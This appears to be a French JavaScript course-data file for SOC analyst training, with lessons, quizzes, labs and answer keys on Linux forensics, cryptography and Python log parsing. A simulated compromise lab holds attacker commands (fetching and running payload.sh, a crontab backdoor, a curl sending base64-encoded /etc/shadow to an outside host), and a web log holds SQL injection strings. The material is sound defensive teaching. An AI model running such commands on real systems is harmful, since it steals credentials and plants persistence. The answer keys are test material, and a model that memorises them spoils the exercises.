[2026-05-25 02:15:10] EventID=7036 ServiceName=WindowsFirewall Status=STOPPED`,
            },
            commands: {},
            questions: [
              {
                id: 'lab-w1',
                text: 'Quelle adresse IP a effectué la tentative de brute force sur le compte Administrator ?',
                answer: '185.220.101.45',
                placeholder: 'X.X.X.X',
              },
              {
                id: 'lab-w2',
                text: 'Quel EventID confirme que la connexion a finalement réussi pour l\'attaquant ?',
                answer: '4624',
                placeholder: 'Numéro d\'EventID',
              },
              {
                id: 'lab-w3',
                text: 'Quel compte utilisateur malveillant a été ajouté au groupe Administrateurs ?',
                answer: 'hacker_account',
                placeholder: 'Nom du compte',
              },
            ],
            hints: [
              'Cherchez les EventID 4625 (échecs) puis 4624 (succès).',
              'EventID 4732 indique un ajout au groupe Administrateurs.',
              'Regardez le champ "Member=" dans l\'Event 4732.',
            ],
          },
        },
        {
          id: 'n0-m2-l2',
          title: 'Linux — Fondamentaux pour le SOC',
          description: 'Système de fichiers Linux, permissions, commandes essentielles et logs système.',
          duration: 60,
          xpReward: 120,
          hasQuiz: true,
          hasLab: true,
          objectives: [
            'Maîtriser la structure du système de fichiers Linux',
            'Comprendre les permissions (chmod, chown)',
            'Connaître les commandes essentielles d\'analyse',
            'Identifier les fichiers logs importants',
          ],
          theory: `# Linux — Fondamentaux SOC

## Structure du Système de Fichiers Linux

Linux suit le standard FHS (Filesystem Hierarchy Standard) :

\`\`\`
/
├── /bin    → Binaires essentiels (ls, cp, mv, cat)
├── /sbin   → Binaires système (ifconfig, iptables)
├── /etc    → Fichiers de configuration ← TRÈS IMPORTANT
├── /home   → Répertoires utilisateurs
├── /root   → Répertoire de root
├── /tmp    → Fichiers temporaires (0777 — risque !)
├── /var    → Données variables
│   ├── /var/log   → LOGS ← Essentiel SOC
│   ├── /var/www   → Fichiers web
│   └── /var/spool → Files d'attente
├── /usr    → Programmes utilisateur
├── /proc   → Système de fichiers virtuel (processus)
├── /sys    → Infos hardware
├── /opt    → Logiciels tiers
└── /dev    → Fichiers de périphériques
\`\`\`

---

## Permissions Linux

### Lecture des permissions

\`\`\`
-rwxr-xr--  1  alice  staff  4096  25 mai  14:00  script.sh
^^^^^^^^^^ ^^ ^^^^^^^^ ^^^^^
│││││││││  │   owner   group
│││││││││  └── nombre de liens
│││││││
│││└└└└── Permissions "autres"  : r-- = 4 (lecture seulement)
│││└└└─── Permissions "groupe"  : r-x = 5 (lecture + exécution)
│└└└───── Permissions "owner"   : rwx = 7 (lecture + écriture + exécution)
└──────── Type : - (fichier), d (dossier), l (lien)
\`\`\`

### Valeurs numériques

\`\`\`
4 = read (r)
2 = write (w)
1 = execute (x)
0 = aucun (-)

Exemples :
chmod 755 → rwxr-xr-x (standard pour scripts)
chmod 644 → rw-r--r-- (standard pour fichiers)
chmod 600 → rw------- (clés SSH privées)
chmod 777 → rwxrwxrwx (DANGER — tout le monde peut tout faire !)
\`\`\`

---

## Fichiers et Logs Critiques pour le SOC

### /etc — Configuration

\`\`\`
/etc/passwd    → Comptes utilisateurs (pas les mots de passe)
/etc/shadow    → Hachages des mots de passe (root only)
/etc/hosts     → Résolution de noms locale
/etc/crontab   → Tâches planifiées système
/etc/sudoers   → Permissions sudo
/etc/ssh/sshd_config → Config SSH
\`\`\`

### /var/log — Logs système

\`\`\`
/var/log/auth.log     → Authentifications (SSH, sudo) ← CRITIQUE
/var/log/syslog       → Messages système généraux
/var/log/kern.log     → Messages kernel
/var/log/messages     → Messages système (RHEL/CentOS)
/var/log/secure       → Auth sur RHEL/CentOS
/var/log/apache2/     → Logs Apache
/var/log/nginx/       → Logs Nginx
/var/log/wtmp         → Historique des connexions (last)
/var/log/btmp         → Tentatives de connexion échouées (lastb)
\`\`\`

### Commandes d'analyse essentielles

\`\`\`bash
# Voir les dernières connexions
last
lastb   # connexions échouées

# Voir qui est connecté maintenant
who
w

# Processus en cours
ps aux
ps aux | grep suspicious_process

# Connexions réseau
netstat -tulpn
ss -tulpn

# Historique des commandes
cat ~/.bash_history
cat /root/.bash_history

# Fichiers récemment modifiés
find / -mtime -1 -type f 2>/dev/null

# Crontabs
crontab -l
cat /etc/crontab
ls /etc/cron.*

# SUID — fichiers dangereux
find / -perm -4000 -type f 2>/dev/null
\`\`\`

---

## Persistance malveillante sur Linux

Les attaquants utilisent ces mécanismes pour maintenir l'accès :

1. **Crontab** : Tâche planifiée cachée qui relance le malware
2. **SSH authorized_keys** : Clé SSH ajoutée pour accès sans mot de passe
3. **Modification de ~/.bashrc** : Code exécuté à chaque connexion
4. **Services systemd** : Service malveillant créé et activé
5. **SUID sur un shell** : chmod u+s /bin/bash = shell root pour tous`,
          quiz: [
            {
              id: 'n0-m2-l2-q1',
              xpReward: 50,
              question: 'Quel fichier Linux contient les hachages des mots de passe ?',
              options: ['/etc/passwd', '/etc/shadow', '/etc/group', '/etc/sudoers'],
              correct: 1,
              explanation: '**/etc/shadow** contient les hachages des mots de passe et n\'est lisible que par root. /etc/passwd contient les informations de compte (sans les mots de passe) et est lisible par tous.',
            },
            {
              id: 'n0-m2-l2-q2',
              xpReward: 50,
              question: 'Quelle commande affiche les tentatives de connexion SSH échouées ?',
              options: ['last', 'lastb', 'who', 'w'],
              correct: 1,
              explanation: '**lastb** lit le fichier /var/log/btmp et affiche les tentatives de connexion **échouées** (bad login attempts). La commande **last** affiche les connexions réussies.',
            },
            {
              id: 'n0-m2-l2-q3',
              xpReward: 50,
              question: 'Quelles permissions chmod permettent à tout le monde d\'écrire dans un fichier (danger !) ?',
              options: ['chmod 644', 'chmod 755', 'chmod 777', 'chmod 600'],
              correct: 2,
              explanation: '**chmod 777** donne les permissions rwxrwxrwx — lecture, écriture et exécution pour le propriétaire, le groupe et tous les autres. C\'est extrêmement dangereux et ne devrait jamais être appliqué à des fichiers sensibles.',
            },
          ],
          lab: {
            id: 'lab-n0-m2-l2',
            title: 'Investigation Linux — Compromission de serveur',
            description: 'Un serveur Linux a été compromis. Analysez les logs pour identifier ce qui s\'est passé.',
            xpReward: 200,
            files: {
              'auth.log': `May 25 03:21:11 server sshd[1234]: Failed password for root from 45.33.32.156 port 34521 ssh2
May 25 03:21:12 server sshd[1234]: Failed password for root from 45.33.32.156 port 34522 ssh2
May 25 03:21:13 server sshd[1234]: Failed password for root from 45.33.32.156 port 34523 ssh2
May 25 03:21:14 server sshd[1234]: Accepted password for root from 45.33.32.156 port 34524 ssh2
May 25 03:21:14 server sshd[1234]: pam_unix(sshd:session): session opened for user root
May 25 03:21:30 server sudo:   root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/wget http://45.33.32.156/payload.sh
May 25 03:21:35 server sudo:   root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/bin/bash payload.sh`,
              'crontab.txt': `# Contenu de /etc/crontab après compromission
* * * * * root /tmp/.hidden_backdoor.sh
@reboot root /tmp/.hidden_backdoor.sh`,
              'bash_history.txt': `wget http://45.33.32.156/payload.sh
bash payload.sh
chmod +x /tmp/.hidden_backdoor.sh
echo "* * * * * root /tmp/.hidden_backdoor.sh" >> /etc/crontab
cat /etc/shadow
curl http://45.33.32.156/exfil?data=$(cat /etc/shadow | base64)`,
            },
            commands: {},
            questions: [
              {
                id: 'lab-l1',
                text: 'Quelle adresse IP a effectué la compromission du serveur ?',
                answer: '45.33.32.156',
                placeholder: 'X.X.X.X',
              },
              {
                id: 'lab-l2',
                text: 'Quelle technique de persistance l\'attaquant a-t-il utilisée ?',
                answer: 'crontab',
                answerAlt: ['cron', 'cron job', 'tache planifiee', 'tâche planifiée'],
                placeholder: 'Nom de la technique',
              },
              {
                id: 'lab-l3',
                text: 'Quel fichier sensible l\'attaquant a-t-il exfiltré ?',
                answer: '/etc/shadow',
                answerAlt: ['shadow', 'etc/shadow'],
                placeholder: 'Chemin du fichier',
              },
            ],
            hints: [
              'Cherchez l\'IP dans auth.log qui a eu un "Accepted password".',
              'Regardez le fichier crontab.txt pour la persistance.',
              'bash_history.txt montre exactement ce que l\'attaquant a fait.',
            ],
          },
        },
      ],
    },
    {
      id: 'n0-m3',
      title: 'Cryptographie',
      lessons: [
        {
          id: 'n0-m3-l1',
          title: 'Cryptographie — Fondamentaux',
          description: 'Comprendre les principes de la cryptographie symétrique, asymétrique et des fonctions de hachage.',
          duration: 50,
          xpReward: 110,
          hasQuiz: true,
          hasLab: false,
          objectives: [
            'Distinguer chiffrement symétrique et asymétrique',
            'Comprendre les fonctions de hachage et leur usage',
            'Comprendre PKI et certificats',
            'Identifier les algorithmes actuels et obsolètes',
          ],
          theory: `# Cryptographie pour le SOC

## Les 3 Piliers de la Cryptographie

### 1. Chiffrement Symétrique

**Une seule clé** pour chiffrer ET déchiffrer.

\`\`\`
Alice                           Bob
 |                               |
 |  Clé partagée (secret)       |
 |  [Données] → [Chiffré] ─────>|  [Chiffré] → [Données]
 |                               |
\`\`\`

**Algorithmes** :
- **AES** (128/192/256 bits) ← Standard actuel, sûr
- **ChaCha20** ← Moderne, utilisé dans TLS 1.3
- **3DES** ← Obsolète, ne pas utiliser
- **DES** ← Cassé depuis 1997, interdit
- **RC4** ← Cassé, ne jamais utiliser (SSL/TLS ancien)

**Avantages** : Rapide, efficace pour gros volumes
**Inconvénient** : Distribution sécurisée de la clé

### 2. Chiffrement Asymétrique (PKI)

**Deux clés liées** : clé publique (partageable) et clé privée (secrète).

\`\`\`
Bob génère : [Clé Publique] + [Clé Privée]
             (peut partager)   (garde secret)

Alice veut envoyer à Bob :
Alice [Données] → Chiffre avec [Clé Publique de Bob] → [Chiffré]
Bob  [Chiffré] → Déchiffre avec [Clé Privée de Bob] → [Données]
\`\`\`

**Algorithmes** :
- **RSA** (2048/4096 bits) ← Courant, sûr si clé ≥ 2048 bits
- **ECDSA/ECDH** ← Moderne, plus efficace que RSA
- **Ed25519** ← Recommandé pour SSH

**Avantages** : Pas de distribution de clé secrète, signatures numériques
**Inconvénient** : Lent (utilisé surtout pour l'échange de clés)

### 3. Fonctions de Hachage

Fonction à **sens unique** qui produit une empreinte (digest) de taille fixe.

\`\`\`
"password"    → SHA-256 → 5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a...
"Password"    → SHA-256 → 61409aa1fd47d4a5332de23cbf59a36f77d9c21f7e8e9e4f...
"password1"   → SHA-256 → 0b14d501a594442a01c6859541bcb3e8164d183d32937b851...
\`\`\`

Un seul caractère différent = empreinte totalement différente.

| Algorithme | Taille | Statut |
|------------|--------|--------|
| MD5 | 128 bits | ❌ Cassé (collisions) |
| SHA-1 | 160 bits | ❌ Déprécié depuis 2017 |
| SHA-256 | 256 bits | ✅ Standard actuel |
| SHA-512 | 512 bits | ✅ Excellent |
| bcrypt | Variable | ✅ Mots de passe uniquement |
| Argon2 | Variable | ✅ Mots de passe (meilleur) |

> **En SOC** : Vous utiliserez SHA-256 pour vérifier l'intégrité des fichiers (IoC). Si le hash d'un fichier connu correspond au hash de votre binaire suspect, vous avez identifié le malware !

---

## PKI — Infrastructure à Clés Publiques

### Certificats X.509

Un certificat contient :
- Clé publique du propriétaire
- Informations sur le propriétaire (CN, O, OU)
- Période de validité
- Signature de l'Autorité de Certification (CA)

### Chaîne de confiance

\`\`\`
Root CA (auto-signé)
  └── Intermediate CA (signé par Root)
        └── Certificate du serveur (signé par Intermediate)
\`\`\`

### En SOC : Signaux d'alerte TLS

- Certificat auto-signé sur un site d'entreprise → Phishing ?
- Certificat expiré → Négligence ou attaquant
- Common Name (CN) ≠ nom du site → Spoofing ?
- CA inconnue → Possible MITM
- TLS 1.0 ou 1.1 → Protocole obsolète et vulnérable

---

## Salage des Mots de Passe

Le "salt" est une valeur aléatoire ajoutée avant le hachage pour empêcher les rainbow tables.

\`\`\`
Sans salt : SHA256("password") = 5e884898... (toujours la même)
Avec salt : SHA256("password" + "aB3x9K") = résultat unique par utilisateur
\`\`\`

En SOC : Si vous trouvez une base de données de mots de passe :
- MD5 sans salt → immédiatement craquable (rainbow tables)
- bcrypt/Argon2 avec salt → très difficile à cracker`,
          quiz: [
            {
              id: 'n0-m3-l1-q1',
              xpReward: 50,
              question: 'Quelle est la différence fondamentale entre chiffrement symétrique et asymétrique ?',
              options: [
                'Le symétrique est plus sécurisé',
                'Le symétrique utilise une seule clé, l\'asymétrique utilise une paire de clés',
                'L\'asymétrique est plus rapide',
                'Le symétrique ne peut pas déchiffrer',
              ],
              correct: 1,
              explanation: 'Le **chiffrement symétrique** utilise une **seule clé secrète** partagée pour chiffrer et déchiffrer. Le **chiffrement asymétrique** utilise une **paire de clés** : une clé publique (partageable) pour chiffrer, et une clé privée (secrète) pour déchiffrer.',
            },
            {
              id: 'n0-m3-l1-q2',
              xpReward: 50,
              question: 'Quel algorithme de hachage est considéré comme cassé et ne doit plus être utilisé pour la sécurité ?',
              options: ['SHA-256', 'SHA-512', 'MD5', 'bcrypt'],
              correct: 2,
              explanation: '**MD5** est considéré comme cassé depuis les années 2000 à cause de vulnérabilités aux collisions (deux entrées différentes produisant le même hash). Il ne doit plus être utilisé pour des besoins de sécurité.',
            },
            {
              id: 'n0-m3-l1-q3',
              xpReward: 50,
              question: 'En SOC, vous trouvez un hash SHA-256 dans un rapport de Threat Intelligence. À quoi vous sert-il ?',
              options: [
                'Déchiffrer le malware',
                'Identifier si un fichier correspond au malware connu (IoC)',
                'Trouver le mot de passe de l\'attaquant',
                'Vérifier l\'authenticité d\'un certificat',
              ],
              correct: 1,
              explanation: 'En SOC, les **hashes de fichiers** (SHA-256) sont des **Indicateurs de Compromission (IoC)**. Vous calculez le hash d\'un fichier suspect et le comparez avec les hashes connus de malwares. Si correspondance → malware confirmé.',
            },
          ],
        },
      ],
    },
    {
      id: 'n0-m4',
      title: 'Python pour la Sécurité',
      lessons: [
        {
          id: 'n0-m4-l1',
          title: 'Python — Scripting pour l\'Analyste SOC',
          description: 'Apprendre Python pour automatiser les tâches d\'analyse SOC : parsing de logs, scripts réseau, IOC lookup.',
          duration: 70,
          xpReward: 150,
          hasQuiz: true,
          hasLab: true,
          objectives: [
            'Maîtriser les bases Python (strings, listes, dicts, fichiers)',
            'Parser des fichiers de logs avec Python',
            'Faire des requêtes HTTP (APIs Threat Intelligence)',
            'Écrire des scripts d\'analyse SOC simples',
          ],
          theory: `# Python pour l'Analyste SOC

## Pourquoi Python en SOC ?

Python est le langage de référence en cybersécurité pour :
- **Parser des logs** (Apache, Windows, Syslog)
- **Automatiser des IOC lookups** (VirusTotal, AbuseIPDB)
- **Analyser des PCAPs** (avec Scapy)
- **Créer des rapports** automatisés
- **Scripts SIEM** et intégrations

---

## Bases Python Essentielles

### Manipulation de chaînes

\`\`\`python
# Parsing d'une ligne de log Apache
log_line = '192.168.1.50 - - [25/May/2026:08:14:32] "GET /admin HTTP/1.1" 403 512'

# Split par espace
parts = log_line.split()
ip = parts[0]          # '192.168.1.50'
method = parts[5][1:]  # 'GET'
url = parts[6]         # '/admin'
code = parts[8]        # '403'

print(f"IP: {ip}, URL: {url}, Code: {code}")
\`\`\`

### Lire et parser des fichiers de logs

\`\`\`python
import re
from collections import Counter

failed_ips = Counter()

with open('auth.log', 'r') as f:
    for line in f:
        if 'Failed password' in line:
            # Extraire l'IP avec regex
            match = re.search(r'from (\\d+\\.\\d+\\.\\d+\\.\\d+)', line)
            if match:
                ip = match.group(1)
                failed_ips[ip] += 1

# Afficher les 10 IP les plus actives
print("Top 10 IP en brute force :")
for ip, count in failed_ips.most_common(10):
    print(f"  {ip}: {count} tentatives")
\`\`\`

### Requêtes API (VirusTotal, AbuseIPDB)

\`\`\`python
import requests

def check_ip_reputation(ip, api_key):
    url = f"https://api.abuseipdb.com/api/v2/check"
    headers = {'Key': api_key, 'Accept': 'application/json'}
    params = {'ipAddress': ip, 'maxAgeInDays': 90}

    response = requests.get(url, headers=headers, params=params)
    data = response.json()

    score = data['data']['abuseConfidenceScore']
    country = data['data']['countryCode']

    return score, country

# Utilisation
score, country = check_ip_reputation('185.220.101.45', 'VOTRE_API_KEY')
print(f"Score d'abus : {score}% | Pays : {country}")
\`\`\`

### Script complet : Détection de brute force

\`\`\`python
import re
from collections import defaultdict
from datetime import datetime

THRESHOLD = 10  # Tentatives max avant alerte

def analyse_auth_log(filepath):
    attempts = defaultdict(list)

    with open(filepath, 'r') as f:
        for line in f:
            if 'Failed password' in line:
                ip_match = re.search(r'from (\\d+\\.\\d+\\.\\d+\\.\\d+)', line)
                time_match = re.search(r'(\\w{3}\\s+\\d+\\s+\\d+:\\d+:\\d+)', line)

                if ip_match and time_match:
                    ip = ip_match.group(1)
                    attempts[ip].append(time_match.group(1))

    # Détecter les IP au-dessus du seuil
    for ip, times in attempts.items():
        if len(times) >= THRESHOLD:
            print(f"[ALERTE] Brute Force détecté !")
            print(f"  IP : {ip}")
            print(f"  Tentatives : {len(times)}")
            print(f"  Première : {times[0]}")
            print(f"  Dernière  : {times[-1]}")
            print()

analyse_auth_log('/var/log/auth.log')
\`\`\`

### Calcul de hash (IOC)

\`\`\`python
import hashlib

def file_hash(filepath, algo='sha256'):
    h = hashlib.new(algo)
    with open(filepath, 'rb') as f:
        for chunk in iter(lambda: f.read(4096), b''):
            h.update(chunk)
    return h.hexdigest()

# Calculer le hash d'un fichier suspect
suspect = 'C:/Users/user/Downloads/update.exe'
sha256 = file_hash(suspect)
md5 = file_hash(suspect, 'md5')

print(f"SHA-256: {sha256}")
print(f"MD5:     {md5}")
# Comparer avec les IoC connus sur VirusTotal/MISP
\`\`\``,
          quiz: [
            {
              id: 'n0-m4-l1-q1',
              xpReward: 50,
              question: 'En Python, quelle méthode utilisez-vous pour extraire l\'adresse IP d\'une ligne de log avec un pattern ?',
              options: ['str.find()', 're.search()', 'str.split()', 'str.replace()'],
              correct: 1,
              explanation: '**re.search()** du module **re** (expressions régulières) est la méthode idéale pour extraire des patterns comme les adresses IP (\\d+\\.\\d+\\.\\d+\\.\\d+) dans des chaînes de log complexes.',
            },
            {
              id: 'n0-m4-l1-q2',
              xpReward: 50,
              question: 'Pourquoi utiliser hashlib.sha256 plutôt que hashlib.md5 pour vérifier l\'intégrité d\'un fichier malveillant ?',
              options: [
                'SHA-256 est plus rapide',
                'MD5 est obsolète et peut avoir des collisions, SHA-256 est cryptographiquement sûr',
                'MD5 ne fonctionne pas avec Python',
                'SHA-256 produit des fichiers plus petits',
              ],
              correct: 1,
              explanation: '**MD5 a des vulnérabilités de collision** (deux fichiers différents peuvent avoir le même hash). En SOC, un attaquant pourrait créer un malware avec le même MD5 qu\'un fichier légitime. **SHA-256 est cryptographiquement sûr** pour la vérification d\'intégrité.',
            },
          ],
          lab: {
            id: 'lab-n0-m4-l1',
            title: 'Script Python — Analyse de logs Apache',
            description: 'Analysez ce fichier de logs Apache pour identifier les IPs malveillantes et les tentatives d\'accès suspectes.',
            xpReward: 200,
            files: {
              'access.log': `192.168.1.100 - - [25/May/2026:08:00:01] "GET /index.html HTTP/1.1" 200 1234
192.168.1.100 - - [25/May/2026:08:00:02] "GET /about.html HTTP/1.1" 200 567
185.220.101.45 - - [25/May/2026:08:00:10] "GET /admin HTTP/1.1" 403 0
185.220.101.45 - - [25/May/2026:08:00:11] "GET /admin/login.php HTTP/1.1" 404 0
185.220.101.45 - - [25/May/2026:08:00:11] "GET /wp-admin HTTP/1.1" 404 0
185.220.101.45 - - [25/May/2026:08:00:12] "GET /phpmyadmin HTTP/1.1" 404 0
185.220.101.45 - - [25/May/2026:08:00:12] "POST /admin/login HTTP/1.1" 401 0
185.220.101.45 - - [25/May/2026:08:00:13] "POST /admin/login HTTP/1.1" 401 0
10.0.0.50 - - [25/May/2026:08:01:00] "GET /api/users HTTP/1.1" 200 8901
10.0.0.50 - - [25/May/2026:08:01:01] "GET /api/users?id=1 OR 1=1-- HTTP/1.1" 500 23
10.0.0.50 - - [25/May/2026:08:01:02] "GET /api/users?id=1 UNION SELECT * FROM users-- HTTP/1.1" 500 23`,
              'analyse.py': `# Script Python à compléter
import re
from collections import Counter

# Lire le fichier de logs
with open('access.log', 'r') as f:
    lines = f.readlines()

# TODO: Identifier les IPs suspectes
# Indice : cherchez les codes 401, 403, 500
`,
            },
            commands: {
              'python3 analyse.py': 'Script Python exécuté. Analysez le code et les logs manuellement.',
              'cat analyse.py': `# Script Python à compléter
import re
from collections import Counter

with open('access.log', 'r') as f:
    lines = f.readlines()

# TODO: Identifier les IPs suspectes`,
            },
            questions: [
              {
                id: 'lab-py1',
                text: 'Quelle IP tente un scan de répertoires d\'administration (admin, wp-admin, phpmyadmin) ?',
                answer: '185.220.101.45',
                placeholder: 'X.X.X.X',
              },
              {
                id: 'lab-py2',
                text: 'Quelle IP tente une injection SQL dans les paramètres URL ? (regardez les codes 500)',
                answer: '10.0.0.50',
                placeholder: 'X.X.X.X',
              },
              {
                id: 'lab-py3',
                text: 'Quel code HTTP indique une tentative d\'authentification échouée ?',
                answer: '401',
                placeholder: 'Code HTTP',
              },
            ],
            hints: [
              'Le code 403 signifie "Forbidden" — la ressource existe mais l\'accès est refusé.',
              'Le code 401 signifie "Unauthorized" — authentification requise.',
              'Une injection SQL dans une URL contient souvent des mots comme "SELECT", "UNION", "OR 1=1".',
            ],
          },
        },
      ],
    },
  ],
}

export default niveau0
